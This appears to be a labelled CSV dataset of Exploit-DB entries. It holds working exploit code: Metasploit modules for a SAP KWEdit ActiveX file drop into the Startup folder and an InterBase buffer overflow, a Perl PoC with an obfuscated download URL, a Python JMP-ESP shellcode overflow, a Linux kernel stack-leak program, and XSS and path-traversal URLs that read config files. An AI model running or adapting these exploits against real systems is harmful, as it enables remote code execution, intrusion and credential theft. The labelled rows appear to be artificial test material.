16493,"EnjoySAP SAP GUI - ActiveX Control Arbitrary File Download (Metasploit) ## # $Id: enjoysapgui_comp_download.rb 11189 2010-12-01 03:18:05Z swtornio $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::EXE  	include Msf::Exploit::Remote::BrowserAutopwn 	autopwn_info({ 		:os_name    => OperatingSystems::WINDOWS, 		:javascript => true, 		:rank       => NormalRanking, 		:vuln_test  => nil, 	})  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'EnjoySAP SAP GUI ActiveX Control Arbitrary File Download', 			'Description'    => %q{ 					This module allows remote attackers to place arbitrary files on a users file system 				by abusing the ""Comp_Download"" method in the SAP KWEdit ActiveX Control (kwedit.dll 6400.1.1.41). 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'MC' ], 			'Version'        => '$Revision: 11189 $', 			'References'     => 				[ 					[ 'CVE', '2008-4830'], 					[ 'OSVDB', '53680'], 					[ 'URL', 'http://dsecrg.com/files/pub/pdf/HITB%20-%20Attacking%20SAP%20Users%20with%20Sapsploit.pdf' ], 				], 			'DefaultOptions' => 				{ 					'InitialAutoRunScript' => 'migrate -f', 				}, 			'Payload'        => 				{ 					'Space'           => 2048, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Automatic', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => '??? ?? ????'))  		register_options( 			[ 				OptString.new('PATH', [ true, 'The path to place the executable.', '/../../../../../../../../Documents and Settings/All Users/Start Menu/Programs/Startup/']), 			], self.class) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request)  		payload_url =  ""http://"" 		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 		payload_url += "":"" + datastore['SRVPORT'] + get_resource() + ""/payload""  		if (request.uri.match(/payload/)) 			return if ((p = regenerate_payload(cli)) == nil) 			data = generate_payload_exe({ :code => p.encoded }) 			print_status(""Sending EXE payload to #{cli.peerhost}:#{cli.peerport}..."") 			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' }) 			return 		end  		vname  = rand_text_alpha(rand(100) + 1) 		exe    = rand_text_alpha(rand(20) + 1)  		content = %Q| <html> <head> 	<script> 		try { 		var #{vname} = new ActiveXObject('Kweditcontrol.KWedit.1'); 		#{vname}.Comp_Download(""#{payload_url}"",""#{datastore['PATH']}/#{exe}.exe""); 		} catch( e ) { window.location = 'about:blank' ; } 	</script> </head> </html> 				|  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		send_response_html(cli, content)  		handler(cli)  	end  end",['kwedit.dll '],1
20870,"Express Burn Plus 4.58 - EBP Project File Handling Buffer Overflow (PoC) #!/usr/bin/perl # # # Express Burn Plus v4.58 EBP Project File Handling Buffer Overflow PoC # # # Vendor: NCH Software # Product web page: http://www.nchsoftware.com # Affected version: 4.58 # # Summary: Express Burn is a program that allows you to create and copy many # kinds of disc media, including Audio (audio CDs / .mp3 CDs), Video (DVDs), # and Data (CDs / DVDs / Blu-ray). # # Desc: The vulnerability is caused due to a boundary error in the processing # of a project file, which can be exploited to cause a unicode buffer overflow # when a user opens e.g. a specially crafted .EBP file. Successful exploitation # could allow execution of arbitrary code on the affected machine. # # # =========================================================================== # # (13d4.a84): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # eax=050a8c70 ebx=004034fc ecx=00000041 edx=fc4d5390 esi=0157cf68 edi=001297fe # eip=004678ef esp=00126420 ebp=001274c0 iopl=0         nv up ei pl nz na pe nc # cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 # *** WARNING: Unable to verify checksum for image00400000 # *** ERROR: Module load completed but symbols could not be loaded for image00400000 # image00400000+0x678ef: # 004678ef 66890c02        mov     word ptr [edx+eax],cx    ds:0023:0157e000=???? # 0:000> d eax # 050a8c70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8c80  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8c90  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8ca0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8cb0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8cc0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8cd0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 050a8ce0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0:000> d esi # 0157cf68  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cf78  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cf88  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cf98  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfa8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfb8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfc8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # 0157cfd8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A. # # =========================================================================== # # # Tested on: Microsoft Windows 7 Ultimate SP1 EN # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic #                             Zero Science Lab - http://www.zeroscience.mk # # # Advisory ID: ZSL-2012-5103 # Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5103.php # # # 25.08.2012 #  use Cwd; use LWP::Simple;  print ""\n         #=---===---===---===---===---===---===---===---=#         |                                               |         |          Proof Of Concept script for          |         |                                               |         |     NCH Software Express Burn Plus v4.58      |         |                                               |         |                                               |         |               ID: ZSL-2012-5103               |         |                                               |         |                      ---                      |         |                                               |         |               Copyleft (c) 2012               |         |                                               |         |  Zero Science Lab - http://www.zeroscience.mk |         |                                               |         #=---===---===---===---===---===---===---===---=#         \n"";  $file = ""Exploit.EBP"";  $zoom = substr("")aZh4/"",3,1).substr(""^7ttr"",2,2).substr(""p>eErZ"",0,1).         substr(""7U:/.9"",2,2).substr(""v/!+T"",1,1).substr(""oL4z55"",3,1).         substr(""erY3%"",0,2).substr(""8oscW1"",1,3).substr(""iLien@"",2,3).         substr(""*hJ2ce"",4,2).substr(""6.#h1A"",1,1).substr(""mk-(("",0,2).         substr("">/cZo"",1,2).substr(""[Mood]4"",3,2).substr(""lesS?"",1,2).         substr(""a*\@J/b"",4,2).substr(""lue8X"",0,3).substr(""fish6"",0,4).         substr("",,8Y.b"",4,1).substr(""GrUmp!"",3,2).substr(""1337:"",2,1);          print ""\n\n\x20\x20\x1A Creating malicious project file...\n\n"";         $decoy = ""440Hz.mp3"";         getstore($zoom, $decoy);         print ""\x20\x20\x1A Throwing decoy file: $decoy...\n"";         $buffer = ""\x41\x41\x41\x41"" x (15000/2);         $dir = getcwd;         $dir =~ s/\//\\/g;  $load = ""<?xml version=\""1.0\""?>\<ExpressBurnProject type=\""0\""><Alb"".         ""umTitle/><TrackList><Audiotrack file=\""$dir\\$decoy\"" title"".         ""=\""$buffer\"" artist=\""Salvador\""/></TrackList>\r</ExpressBu"".         ""rnProject>\r"";          open fp, "">./$file"" || die ""\n[-] Can't open $file: $!\n\n"";         print fp $load; close fp;         print ""\n\x20\x20\x19 File created successfully: $file "";         $file = -s $file; print ""($file bytes).\n\n\n"";  ##EOF",['EBP'],0
25272,Dream4 Koobi CMS 4.2.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/12895/info  Koobi CMS is reportedly affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/index.php?area=[XSS],"[""'index.php'""]",1
39417,"FTPShell Client 5.24 - 'Create NewFolder' Local Buffer Overflow #[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+] #[+] Exploit Title: FTPShell Client (Add New Folder) Local Buffer Overflow #[+] Date: 2/2/2016 #[+]Exploit Author: Arash Khazaei #[+] Vendor Homepage: www.ftpshell.com #[+]Software Link: http://www.ftpshell.com/download.htm #[+] Version: 5.24 #[+] Tested on: Windows XP Professional SP3 (Version 2002) #[+] CVE : N/A #[+] introduction : Add New Folder In Remote FTP Server And In Name Input Copy Buffer.txt File content  #[+] or click on Remote Tab Then Click On Create Folder And Copy Buffer.txt In Name Input ... #[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]  #!/usr/bin/python filename = ""buffer.txt"" # Junk A junk = ""A""*452 #77FAB277  JMP ESP # Windows Xp Professional Version 2002 Service Pack 3 eip = ""\x77\xB2\xFA\x77"" # Nops nops = ""\x90""*100 # Shellcode Calc.exe 16Byte buf=(""\x31\xC9"" ""\x51""     ""\x68\x63\x61\x6C\x63""     ""\x54""     ""\xB8\xC7\x93\xC2\x77""     ""\xFF\xD0"")  #Appending Buffers Together exploit = junk + eip + nops + buf #Creating File length = len(exploit) print ""[+]File name:     [%s]\n"" % filename print ""[+]Payload Size: [%s]\n "" % length  print ""[+]File Created.\n""  file = open(filename,""w"") file.write(exploit) file.close print exploit   #[+] Very Special Tnx To My Best Friends: TheNonexistent,Nirex,Pr0t3ctor","[""'Create""]",0
27079,Web Host Automation Ltd. Helm 3.2.8 - 'ForgotPassword.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/16234/info  Helm is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 3.2.8 is reported vulnerable; other versions may also be affected.  http://www.example.com/forgotPassword.asp?txtEmailAddress=[XSS],"[""'ForgotPassword.asp'""]",1
19359,"Microsoft Windows NT 4.0/SP1/SP2/SP3/SP4 / NT 3.5.1/SP1/SP2/SP3/SP4/SP5 - Screensaver source: https://www.securityfocus.com/bid/474/info  When the computer is idle for the set time period (user definable) Winlogon.exe starts the screensaver. The screen saver process is selectable by the user. Winlogon.exe uses the CreateProcessAPI call to start the screen saver and immediately suspends it. At this point the screen saver is running with the security context of Winlogon.exe (system). Winlogon obtains the process handle, changes the primary security token of the screen saver to match the current user, and resumes the screen saver. Winlogon never verifies that the token change was successful. Therefore, a user could create an executable, set it as the screen saver, and should the security change fail it will run with full system-level privileges.   This exploit and description provided by Cybermedia Software Private Limited.  The simulation consists of one 32-bit application say BEADMIN.EXE and one MS-DOS based application, say SCRNSAVE.EXE. The BEADMIN.EXE when started does the following Creates one event in â??not-signalâ??ed state Sets up the screen saver. The screen saver executable is specified as SCRNSAVE.EXE and the timeout is set to minimum. . BEADMIN.EXE now waits on the event. After some time, the screen saver is triggered. This results in Winlogon.Exe spawning SCRNSAVE.EXE. Since the CreateProcess call returns junk handle to Winlogon.Exe, the setting of primary token fails. Hence the SCRNSAVE.EXE application (NTVDM.EXE) runs in System Context. This SCRNSAVE.EXE again spawns BEADMIN.EXE application. Now this second copy of BEADMIN.EXE inherits the security context of NTVDM which is System Context. This application adds the logged in user to admin group and signals the event on which first instance of BEADMIN.EXE is waiting. In response to this the first copy of BEADMIN.EXE resets back the Screen Saver settings and quits. The logged in user name is passed between the first and second copy of BEADMIN.EXE using shared section.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19359.zip","['Winlogon.exe', 'SCRNSAVE.EXE']",1
22282,WihPhoto 0.86 dev - 'sendphoto.php' File Disclosure source: https://www.securityfocus.com/bid/6929/info  A vulnerability has been reported for WihPhoto that may result in the disclosure of files to remote attackers.  The vulnerability exists due to inadequate verification of some URI parameters in the sendphoto.php script file.  An attacker can exploit this vulnerability and specify arbitrary files as the parameters to the variables. This will cause WihPhoto to send an email with the attacker-specified file as an attachment.    http://www.example.org/sendphoto.php?album=..&pic=config.inc.php http://www.example.org/sendphoto.php?album=..&pic=config.inc.php&sendto=[E-MAIL]&filled=1,"[""'sendphoto.php'""]",1
33691,Comptel Provisioning and Activation - 'index.jsp?error_msg_parameter' Cross-Site Scripting source: https://www.securityfocus.com/bid/38534/info  Comptel Provisioning and Activation is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/sas5/index.jsp?error_msg_parameter=%3CScRiPt%3Ealert%28%27XSS%27%29%3C/ScRiPt%3E,"[""'index.jsp?error_msg_parameter'""]",1
10020,"Borland Interbase 2007/2007 SP2 - 'jrd8_create_database' Remote Buffer Overflow (Metasploit) ## # $Id$ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'Borland InterBase jrd8_create_database() Buffer Overflow', 			'Description'	=> %q{ 				This module exploits a stack overflow in Borland InterBase 				by sending a specially crafted create request. 			}, 			'Version'	=> '$Revision$', 			'Author'	=> 				[ 					'ramon', 					'Adriano Lima <adriano@risesecurity.org>', 				], 			'Arch'		=> ARCH_X86, 			'Platform'	=> 'linux', 			'References'	=> 				[ 					[ 'CVE', '2007-5243' ], 					[ 'OSVDB', '38606' ], 					[ 'BID', '25917' ], 					[ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ], 				], 			'Privileged'	=> true, 			'License'	=> MSF_LICENSE, 			'Payload'	=> 				{ 					'Space' => 128, 					'BadChars' => ""\x00\x2f\x3a\x40\x5c"", 				}, 			'Targets'	=> 				[ 					# 0x0804cbe4 pop esi; pop ebp; ret 					[ 						'Borland InterBase LI-V8.0.0.53 LI-V8.0.0.54 LI-V8.1.0.253', 						{ 'Ret' => 0x0804cbe4 } 					], 				], 			'DefaultTarget'	=> 0 		))  		register_options( 			[ 				Opt::RPORT(3050) 			], 			self.class 		)  	end  	def exploit  		connect  		# Create database 		op_create = 20  		length = 544 		remainder = length.remainder(4) 		padding = 0  		if remainder > 0 			padding = (4 - remainder) 		end  		buf = ''  		# Operation/packet type 		buf << [op_create].pack('N')  		# Id 		buf << [0].pack('N')  		# Length 		buf << [length].pack('N')  		# It will return into this nop block 		buf << make_nops(length - payload.encoded.length - 4)  		# Payload 		buf << payload.encoded  		# Target 		buf << [target.ret].pack('V')  		# Padding 		buf << ""\x00"" * padding  		# Database parameter block  		# Length 		buf << [1024 * 32].pack('N')  		# Random alpha data 		buf << rand_text_alpha(1024 * 32)  		sock.put(buf)  		handler  	end  end","[""'jrd8_create_database'""]",1
9521,"Linux Kernel 2.6.30 - 'atalk_getname()' 8-bytes Stack Disclosure (1) /**  * appleak.c  *  * Linux keunouille <= 2.6.30  *  * AppleTalk getsockname() 8-bytes kernel stack disclosure  *  * http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=3d392475c873c10c10d6d96b94d092a34ebd4791  *  * atalk_getname() can leak 8 bytes of kernel memory to user  *  * [clem1@noe ~]$ ./appleak  * 1e 83 f2 31 ec 56 d7 f6 | ...1.V..  * 00 f4 55 f6 84 2a ca bf | ..U..*..  * 00 f4 55 f6 1e 83 f2 31 | ..U....1  * 1e 83 f2 31 00 60 5e f6 | ...1.`^.  * 00 f4 55 f6 84 2a ca bf | ..U..*..  * c0 2a 54 c0 a8 61 45 f6 | .*T..aE.  * 21 54 12 c0 84 2a ca bf | !T...*..  * (...)  *  * (c) ClÃ©ment LECIGNE <root[a]clem1.be>  */ #include <stdlib.h> #include <string.h> #include <stdio.h> #include <errno.h> #include <unistd.h> #include <time.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/syscall.h> #include <net/if_arp.h> #include <linux/atalk.h>  void kernop(int fd) {     /* from Jon Oberheide sploit      */     const int   randcalls[] = {         __NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,         __NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,          __NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,          __NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,          __NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,          __NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,         __NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,          __NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,          __NR_sched_getparam, __NR_sched_get_priority_max     };     const int   randsopts[] = { SOL_SOCKET, AF_APPLETALK };     int         ret, len;     char        buf[1024];      do     {         switch ( rand() % 3 )         {             case 0:                 ret = syscall(randcalls[rand() % sizeof(randcalls)/sizeof(randcalls[0])]);                 break;             case 1:                 len = (rand() % 2) ? sizeof(int) : sizeof(buf);                 ret = getsockopt(fd, randsopts[rand() % sizeof(randsopts)/sizeof(randsopts[0])], rand() % 130, &buf, &len);                 break;             case 2:                 len = (rand() % 2) ? sizeof(int) : sizeof(buf);                 ret = setsockopt(fd, randsopts[rand() % sizeof(randsopts)/sizeof(randsopts[0])], rand() % 130, &buf, len);                 break;         }     }     while ( ret < 0 ); }  void dump( unsigned char * data, unsigned int len ) {     unsigned int dp, p;     const char trans[] =     ""................................ !\""#$%&'()*+,-./0123456789""     "":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm""     ""nopqrstuvwxyz{|}~....................................""     "".....................................................""     ""........................................"";      for ( dp = 1; dp <= len; dp++ )     {         printf(""%02x "", data[dp-1]);         if ( (dp % 8) == 0 )         {             printf(""| "");             p = dp;             for ( dp -= 8; dp < p; dp++ ) {                 printf(""%c"", trans[data[dp]]);             }             printf(""\n"");         }     }      return; }  int main(void) {     struct sockaddr_at  sat;     int                 s, len = sizeof(sat), occ = 500;     char                prev_zero[sizeof(sat.sat_zero)] = { 0 };      s = socket(AF_APPLETALK, SOCK_DGRAM, 0);     if ( s == -1 )     {         perror(""socket"");         return EXIT_FAILURE;     }      memset(&sat, 0, sizeof(sat));     sat.sat_family = AF_APPLETALK;     sat.sat_addr.s_net = htons(ATADDR_ANYNET);     sat.sat_addr.s_node = ATADDR_ANYNODE;     sat.sat_port = ATADDR_ANYPORT;      if ( bind(s, (struct sockaddr *) &sat, len) < 0 )     {         perror(""bind"");         return EXIT_FAILURE;     }      srand(time(NULL) ^ getpid());      while ( --occ )     {         kernop(s);          if ( getsockname(s, (struct sockaddr *) &sat, &len) == 0 )         {             if ( memcmp(sat.sat_zero, prev_zero, sizeof(sat.sat_zero)) != 0 )             {                 dump((unsigned char *) &sat.sat_zero, sizeof(sat.sat_zero));                 memcpy(&prev_zero, &sat.sat_zero, sizeof(sat.sat_zero));                 usleep(5000);             }         }     }      close(s);      return EXIT_SUCCESS; }  // milw0rm.com [2009-08-26]","[""'atalk_getname()'""]",1
9847,"Portili Personal and Team Wiki 1.14 - Multiple Vulnerabilities (1) Abysssec Inc Public Advisory   Title  : Portili Personal and Team Wiki Multiple Remote Vulnerabilities Affected Version : Portili Personal and Team Wik   <= 1.14 Vendor  Site   : www.Portili.com  Discovery : www.Abysssec.com   Vendor Contact  : 10/4/2009 Vendor Response : 11/4/2009  Vendor Response :   i have fixed all the vulnerabilities outlined and will release the fixes in the next version of the wiki. The most troublesome vulnerabilities have come from the included ajaxfilemanager 3rd party image manager  application (particularly in trying to integrate it with my own user authentication system).  I'm planning to completely overhaul this at some point.    Description :   this vulnerabites founded for a internal penetration testing project but now we decide to send vulnerabites to vendor.  so there is no point to keep these private anymore these vulnerabities are just for educational purpose and author will  be not be responsible for any damage using this vulnerabiltes .   Vulnerabilites :    1- Admin Password Disclosure Exploit in ajaxfilemanager/ajax_save_name.php  Vulnerability :   there an intersting vulnerability in this code .    line 16-23  elseif(empty($_POST['name'])) 	{ 		$error = ERR_RENAME_EMPTY; 	}elseif(!preg_match(""/^[a-zA-Z0-9 _\-.]+$/"", $_POST['name'])) 	{ 		$error = ERR_RENAME_FORMAT; 	}elseif(empty($_POST['original_path']) || !file_exists($_POST['original_path'])) 	    =======================================  line 39-68  	//update record of session if image exists in session for cut or copy 		include_once(CLASS_SESSION_ACTION); 		$sessionAction = new SessionAction();		 		$selectedDocuments = $sessionAction->get(); 		if(removeTrailingSlash($sessionAction->getFolder()) == getParentPath($_POST['original_path']) && sizeof($selectedDocuments)) 		{ 			if(($key = array_search(basename($_POST['original_path']), $selectedDocuments)) !== false) 			{ 				$selectedDocuments[$key] = $_POST['name']; 				$sessionAction->set($selectedDocuments); 				 			} 			 		}elseif(removeTrailingSlash($sessionAction->getFolder()) == removeTrailingSlash($_POST['original_path'])) 		{ 			$sessionAction->setFolder($_POST['original_path']); 		}	 		$path = addTrailingSlash(getParentPath($_POST['original_path'])) . $_POST['name']; 		if(is_file($path)) 		{ 			include_once(CLASS_FILE); 			$file = new file($path); 			$fileInfo = $file->getFileInfo(); 		}else 		{ 			include_once(CLASS_MANAGER); 			$manager = new manager($path, false); 			$fileInfo = $manager->getFolderInfo(); 		} 	}  =============================================================================== there is two problem in code first is it won't check for logged user and next is in the logic of this code . as you can see in code we can change any directory even config directory so we can copy the config to uplods and then you can  download the config file that contains user / pass of administrator .  PoC : http://vulnerable.com/ajaxfilemanager/ajax_save_name.php  POST: original_path=../application/config&name=uploads  now you can go and download the config .   Fast Solution :   add this lines to first of ajax_save_name.php          // ensure that only logged in users may access this script 	if (!file_exists('../authenticate_user.php')) { exit(""couldn't locate the file authenticate_user.php""); }	//exit if the user authentication script cannot be found 	require_once('../authenticate_user.php');	//exit if the user is not authenticated by the codeigniter application     2- File Upload Vulnerability /Fckeditor  Vulnerability :   Using Fckeditor without any authentication will give ability to attacker to  upload his / her own file and fckeditor won't check file extention it will give ability to attacker upload a malicius server side ASP / ASPX / PHP  / JSP . so this vulnerability can creation access to server / portal completely .   PoC : http://www.vulnerable.com/fckeditor/editor/filemanager/connectors/test.html   3- Information Leakage in /phpinfo.php  Vulnerability:   there is phpinfo.php can leak information about path and installation of web / php and  disabled / enabled functions as well as extentions and modules .  PoC : http://www.vulnerable.com/phpinfo.php   4- Cross Site Scripting in ajaxfilemanager/ajaxfilemanager.php   Vulnerability :  after you logged in into the admin panel with a valid password there is a uncheked variable named view .  line 49-61  	if(!empty($_GET['view'])) 	{ 		switch($_GET['view']) 		{ 			case 'detail': 			case 'thumbnail': 				$view = $_GET['view']; 				break; 			default: 				$view = CONFIG_DEFAULT_VIEW; 		} 	}else  	{ 		$view = CONFIG_DEFAULT_VIEW; 	}  PoC  : http://vulnerable.com/ajaxfilemanager/ajaxfilemanager.php?path=../uploads/&view=1<script>alert(""abysssec"")</script>    feel free to contact me : admin [at] abysssec.com","['name.php ', ""user.php'"", 'phpinfo.php ']",1
